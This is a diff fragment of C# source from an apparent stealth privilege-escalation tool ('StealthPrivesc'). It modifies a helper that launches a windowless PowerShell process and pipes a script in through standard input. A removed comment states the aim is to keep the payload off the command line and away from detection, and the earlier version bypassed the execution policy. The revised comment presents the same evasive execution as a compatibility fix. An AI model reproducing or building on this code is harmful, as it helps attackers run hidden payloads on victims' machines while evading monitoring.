@@ -37,13 +37,14 @@ namespace StealthPrivesc {
                 }
             }
         }
-        // A hidden PowerShell that reads its script from standard input (-Command -), so the payload never
-        // appears on the command line as a base64 beacon.
+        // Read the complete UTF-8 script before parsing, so multiline statements
+        // execute consistently across Windows PowerShell and PowerShell 7.
         public static string Ps(string host, string code, int seconds, int maximum) {
             using (var process = new Process()) {
-                var input = new UTF8Encoding(false).GetBytes(code); // UTF-8 without BOM; -Command - expects no leading marker.
-                process.StartInfo = new ProcessStartInfo(host, "-STA -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -") {
-                    UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true, RedirectStandardError = true, RedirectStandardInput = true
+                var input = new UTF8Encoding(false).GetBytes(code);
+                process.StartInfo = new ProcessStartInfo(host, "-STA -NoLogo -NoProfile -NonInteractive -Command \"[Console]::InputEncoding = [Text.Encoding]::UTF8; [Console]::OutputEncoding = [Text.Encoding]::UTF8; & ([scriptblock]::Create([Console]::In.ReadToEnd()))\"") {
+                    UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true, RedirectStandardError = true, RedirectStandardInput = true,
+                    StandardOutputEncoding = Encoding.UTF8, StandardErrorEncoding = Encoding.UTF8
                 };
                 process.Start();
                 try { process.StandardInput.BaseStream.Write(input, 0, input.Length); process.StandardInput.Close(); }
